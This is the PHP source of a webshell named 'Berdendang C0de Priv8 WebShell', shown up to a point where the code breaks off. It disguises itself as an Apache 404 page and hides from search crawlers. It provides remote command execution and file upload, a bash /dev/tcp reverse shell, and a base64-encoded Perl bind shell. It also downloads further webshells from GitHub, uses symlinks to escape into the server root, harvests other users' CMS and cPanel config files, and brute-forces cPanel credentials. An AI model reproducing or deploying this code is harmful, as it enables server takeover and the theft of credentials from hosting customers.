<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "d0763edaa9d9bd2a9516280e9044d885";
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<title>404 Not Found</title>
<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST'] ?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></center>
<form method="post">
<input type="password" name="pass">
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<head>
	<title>BerdendangC0de</title>
</head>
<style>
body {
	background-color: black;
	color: white;
	font-family: courier;
	font-size: 13px;}
select {
	background: transparent;
	color: white;
	border: 1px solid white;
	margin: 4px auto;
	padding-left: 4px;
	font-family: Courier;
	font-size: 13px;
}
input[type=text],[type=submit]{
	background: transparent;
	color: white;
	border: 1px solid white;
	margin: 4px auto;
	padding-left: 4px;
	font-family: Courier;
	font-size: 13px;}
li {
	display: inline;
	margin: 4px;
	padding: 4px;
	color: white;}
ul {
	border-top: 1px solid white;
	border-bottom: 1px solid white;
}
a {
	color: white;
	text-decoration: none;}
a:hover {
	color: red;
	text-decoration: underline;}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: Courier;
	font-size: 13px;}
</style>
<?php
######################################################
// Berdendang C0de Priv8 WebShell
// sebagian func shell ini mengabil dari shell nginx - idx - stupidc0de - dll
// Thank's to nginx - idx - stupidc0de - dll
// Thank's To : Wilr00t - lestravo
// contact : ursicksir@gmail.com
######################################################
function convertByte($s) {
    if ($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';
    elseif ($s >= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';
    elseif ($s >= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';
    else return $s . ' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	}}
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$ds = @ini_get("disable_functions");
$disable_func = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=red>NONE</font>";
$safemode = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=red>OFF</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";}
else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];}
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
########################
//BATAS
########################
echo '<table style="font-size:13px;" height="50px"><tr>';
echo '<td>';
echo '<b><font color=red>'.php_uname().'</b></font><br />';
echo 'User: <font color="red">'.$user.'</font> ('.$uid.') Group: <font color="red">'.$group.'</font> ('.$gid.')<br>';
echo 'Disable Funcions : '.$disable_func.' <br /> Safe Mode : '.$safemode.'<br />';
echo 'Server IP : <font color=red>'.gethostbyname($_SERVER['HTTP_HOST']).'</font><br />';
echo 'Admin : <font color=red>'.$_SERVER['SERVER_ADMIN'].'</font><br />';
echo 'Server Software : <font color=red>'.getenv("SERVER_SOFTWARE").'</font><br />';
echo 'Disk : <font color=red>'.convertByte(disk_free_space("/")).' / '.convertByte(disk_total_space("/")).'</font><br />';
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <p />";
echo '<form enctype="multipart/form-data" method="post">
	  <input type="file" name="filesx" />
	  <input type="submit" name="btn" value="upload" />';
if(isset($_POST['btn'])){
	if(@copy($_FILES['filesx']['tmp_name'], "$dir/".$_FILES['filesx']['name']."")) {
		echo "<br /><font color=lime>Uploaded!</font> : <b>$dir/".$_FILES['filesx']['name']."</b>";
	}
	else {
		echo '<br />Failed Upload File';
	}
}
echo "<br />Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo '</form>';
echo '</td>';
$ghostbuster = '
<div style="font-size:10px;color:red;">
<center>
<pre>
 ________________________________
< Berdendang C0de Priv8 WebShell >
< '.$user.'@'.gethostbyname($_SERVER['HTTP_HOST']).' > 
 --------------------------------
   \
    \
       .--.
       |o_o |
       |:_/ |
      //   \ \
     (|     | )
    /\'\_   _/`\
    \___)=(___/
</pre>
</center>
</div>
';
echo '<td width="30%"> '.$ghostbuster.'';
echo "<center><form method='post'>
	<input type='text' size='15' height='10' name='cmd'><input type='submit' name='do_cmd' value=exec>
	</form></center>";
echo '</td>';
echo '</tr></table>';
echo '<center>
	  <ul>
	  <li><a href="?"><b>Main</b></a></li>
	  <li><a href="?dir='.$dir.'&crot=network"><b>Network</b></a></li>
	  <li><a href="?dir='.$dir.'&crot=summonshell"><b>Summon Shell</b></a></li>
	  <li><a href="?dir='.$dir.'&crot=bypass"><b>Bypass Menu</b></a></li>
  	  <li><a href="?dir='.$dir.'&crot=spammer"><b>Spammer Tools</b></a></li>
   	  <li><a href="?dir='.$dir.'&crot=jumping"><b>Jumping</b></a></li>
   	  <li><a href="?dir='.$dir.'&crot=ngesym"><b>Symlink</b></a></li>
   	  <li><a href="?dir='.$dir.'&crot=hash"><b>Hash</b></a></li>
   	  <li><a href="?dir='.$dir.'&crot=cpanel"><b>Cpanel Crack</b></a></li>
   	  <li><a href="?dir='.$dir.'&crot=config"><b>Grab Config</b></a></li>
   	  <li><a style="color: red;" href="?logout=true"><b>Logout</b></a></li>
	  </ul>
	  </center>';
#############################
// Batas - Berdendang C0de
#############################
if ($_GET['crot'] == network){
	echo '<center>';
	echo 'Network';
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='exec'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='exec'>
	</form>";
	if(isset($_POST['sub_bc'])) {
		$ip = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
	}
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	echo '</center>';
}
elseif($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
	}
elseif ($_GET['crot'] == 'ngesym') {
    @set_time_limit(0);
    echo "<center><h1>Symlink Server</h1></center>";
    @mkdir('BerdendangC0de', 0777);
    $htaccess = "T3B0aW9ucyBhbGwgCiBEaXJlY3RvcnlJbmRleCBTdXguaHRtbCAKIEFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIAogQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCiAgQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sIAogQWRkSGFuZGxlciB0eHQgLmh0bWwgCiBSZXF1aXJlIE5vbmUgCiBTYXRpc2Z5IEFueQ==";
    $write = @fopen('BerdendangC0de/.htaccess', 'w');
    fwrite($write, base64_decode($htaccess));
    @symlink('/', 'BerdendangC0de/root');
    $filelocation = basename(__FILE__);
    $read_named_conf = @file('/etc/named.conf');
    if (!$read_named_conf) {
        echo "<pre class=ml1 style='margin-top:5px'>Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
    } else {
    	echo "<table><td>Domains</td><td>Users</td><td>symlink </td>";
        foreach ($read_named_conf as $subject) {
            if (eregi('zone', $subject)) {
                preg_match_all('#zone "(.*)"#', $subject, $string);
                flush();
                if (strlen(trim($string[1][0])) > 2) {
                    $UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
                    $name = $UID['name'];
                    @symlink('/', 'BerdendangC0de/root');
                    $name = $string[1][0];
                    $iran = '\.ir';
                    $israel = '\.il';
                    $indo = '\.id';
                    $sg12 = '\.sg';
                    $edu = '\.edu';
                    $gov = '\.gov';
                    $gose = '\.go';
                    $gober = '\.gob';
                    $mil1 = '\.mil';
                    $mil2 = '\.mi';
                    $malay = '\.my';
                    $china = '\.cn';
                    $japan = '\.jp';
                    $austr = '\.au';
                    $porn = '\.xxx';
                    $as = '\.uk';
                    $calfn = '\.ca';
                    if (eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0]) or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0]) or eregi("$malay", $string[1][0]) or eregi("$china", $string[1][0]) or eregi("$japan", $string[1][0]) or eregi("$austr", $string[1][0]) or eregi("$porn", $string[1][0]) or eregi("$as", $string[1][0]) or eregi("$calfn", $string[1][0])) {
                        $name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $string[1][0] . '</div>';
                    }
                    echo "
<tr>

<td>
<a target='_blank' href=http://" . $string[1][0] . '/>' . $name . ' </a> </div>
</td>

<td>
' . $UID['name'] . "
</td>

<td>
<a href='BerdendangC0de/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
                    flush();
                }
            }
        }
    }
    echo "</center></table>";
}
elseif($_GET['crot'] == 'summonshell'){
	echo '<center>';
	$summonidx = file_get_contents('https://raw.githubusercontent.com/florienzh4x/webshell/master/indoxploit.php');
	$summonwso = file_get_contents('https://raw.githubusercontent.com/florienzh4x/webshell/master/wso.php');
	$summonconkill = file_get_contents('https://raw.githubusercontent.com/florienzh4x/webshell/master/symcon.php');
	$summonbrudul = file_get_contents('https://raw.githubusercontent.com/florienzh4x/webshell/master/brudul.php');
	echo 'Summon Shell<br />';
	echo '<form method=post>
		  <select name=shell>
		  <option value=1>Idx Shell</option>
		  <option value=2>WSO</option>
		  <option value=3>Symlink Config</option>
  		  <option value=4>Brudul Shell</option>
		  </select> 
		  <input type="submit" value="exec"><br />';
	if($_POST['shell'] == '1'){
		$new = fopen('idx.php', w);
		fwrite($new, $summonidx);
		fclose($new);
		echo'done IndoXploit';
	}
	elseif($_POST['shell'] == '2'){
		$new = fopen('wso.php', w);
		fwrite($new, $summonwso);
		fclose($new);
		echo'done WSO';
	}
	elseif($_POST['shell'] == '3'){
		$new = fopen('symcon.php', w);
		fwrite($new, $summonconkill);
		fclose($new);
		echo'done Symlink Config';
	}
	elseif($_POST['shell'] == '4'){
		$new = fopen('heker.php', w);
		fwrite($new, $summonbrudul);
		fclose($new);
		echo'done Brudul';
	}
	else{
		echo '~ ...';
	}
	echo '</center>';
}
elseif($_POST['do_cmd']){
	echo '<pre>'.exe($_POST['cmd']).'</pre>';
}
elseif($_GET['crot'] == 'hash') {
    $submit = $_POST['enter'];
    if (isset($submit)) {
        $pass = $_POST['password']; // password
        $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
        $hash = md5($pass); // md5 hash #1
        $md4 = hash("md4", $pass);
        $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
        $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
        $hash1 = sha1($pass); // sha1 hash #4
        $sha256 = hash("sha256", $text);
        $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
        $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
        
    }
    echo '<form action="" method="post"><b><table class=tabnet>';
    echo '<tr><th colspan="2">Password Hash</th></center></tr>';
    echo '<tr><td><b>Input here :</b></td>';
    echo '<td><input class="inputz" type="text" name="password" size="40" />';
    echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
    echo '</td></tr><br>';
    echo '<tr><th colspan="2">Hasil Hash</th></center></tr>';
    echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value=' . $pass . '></td></tr>';
    echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value=' . $hash . '></td></tr>';
    echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value=' . $md4 . '></td></tr>';
    echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash_md5 . '></td></tr>';
    echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value=' . $hash_md5_double . '></td></tr>';
    echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value=' . $hash1 . '></td></tr>';
    echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value=' . $sha256 . '></td></tr>';
    echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1 . '></td></tr>';
    echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1_double . '></td></tr></table>';
}
elseif($_GET['crot'] == 'cpanel'){
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {
                            
                        } else {
                            $i++;
                            if(function_exists('posix_getpwuid')) {
                                $domain_cp = file_get_contents("/etc/named.conf");  
                                if($domain_cp == '') {
                                    $dom =  "<font color=red>gabisa ambil nama domain nya</font>";
                                } else {
                                    preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                    foreach($domains_cp[1] as $dj) {
                                        $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                        $user_cp_url = $user_cp_url['name'];
                                        if($user_cp_url == $ucp) {
                                            $dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
                                            break;
                                        }
                                    }
                                }
                            } else {
                                $dom = "<font color=red>function is Disable by system</font>";
                            }
                            echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>BerdendangC0de.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/^[client]$/", $ambil)) {
                    preg_match("/password=(.*?)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    } else {
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Crack'>
        </form>
        <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
}
elseif($_GET['crot'] == 'config'){
	    $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
    $idx = mkdir("BerdendangConf", 0777);
    $isi_htc = "Options all\nRequire None\nSatisfy Any";
    $htc = fopen("BerdendangConf/.htaccess","w");
    fwrite($htc, $isi_htc);
    while($passwd = fgets($etc)) {
        if($passwd == "" || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach($user_config[1] as $user_idx) {
                $user_config_dir = "/home/$user_idx/public_html/";
                if(is_readable($user_config_dir)) {
                    $grab_config = array(
                        "/home/$user_idx/.my.cnf" => "cpanel",
                        "/home/$user_idx/.accesshash" => "WHM-accesshash",
                        "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
                        "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
                        "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/forum/config.php" => "phpBB",
                        "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
                        "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
                        "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
                        "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
                        "/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
                    foreach($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if($ambil_config == '') {
                        } else {
                            $file_config = fopen("BerdendangConf/$user_idx-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }       
            }
        }   
    }
    echo "<center><a href='?dir=$dir/BerdendangConf'><font color=lime>Done</font></a></center>";
}
elseif($_GET['crot'] == 'bypass'){
	echo '<center>';
	echo '<form method=post>
		  <select name=crotz>
		  <option value="cat /etc/passwd">/etc/passwd</option>
		  <option value="netstat -an | grep -i listen">netstat</option>
		  <option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
		  <option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
		  <option value="cat /etc/hosts">/etc/hosts</option>
 		  <option value="cat /etc/named.conf">/etc/named.conf</option>
		  <option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
		  </select>
		  <input type="submit" value="Crotz" />
		  </form><br />';
	echo '<form method=post>
		  <select name=crotz2>
		  <option value=brpwsf>Bypass Root Path With System Function</option>
		  </select>
		  <input type="submit" value="Crotz"/>
		  </form>';
	$manusiadendang = $_POST['crotz']; //Thank's To YuyudHNc
	$manusiadendang2 = $_POST['crotz2'];
	if($_POST['crotz']){
		echo '<pre>'.exe($manusiadendang).'</pre>';
	}
	elseif($_POST['crotz2']) {
		if($_POST['crotz2'] == 'brpwsf'){
			mkdir('Berdendang', 0755);
			chdir('Berdendang');
			system('ln -s / Cerotz'); 
			$htaccess ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
		  	$file = fopen(".htaccess","w+"); 
	 	 	$write = fwrite ($file ,base64_decode($htaccess)); 
		  	$Manusia_Berdendang = symlink("/","Cerotz"); 
	 	 	$Boom="<br><a href=Berdendang/Cerotz TARGET='_blank'><b>Crotz Here!</b></a>"; 
		  	echo "<center>$Boom</center>";
		  	}
		}
	echo '</center>';
}
elseif($_GET['crot'] == 'spammer'){
	echo 'Spammer Tools<br/ >';
	echo 'Incoming';
}
elseif($_GET['crot'] == 'jumping'){ //Thank To IndoXploit
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'>$url_user</a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'>$url_user</a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo '<br>Total ada '.$i.' Kamar di '.gethostbyname($_SERVER['HTTP_HOST']).' ~ BerdendangC0de';
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'>$web_vh</a>";
						if(is_writable($web_vh)) {
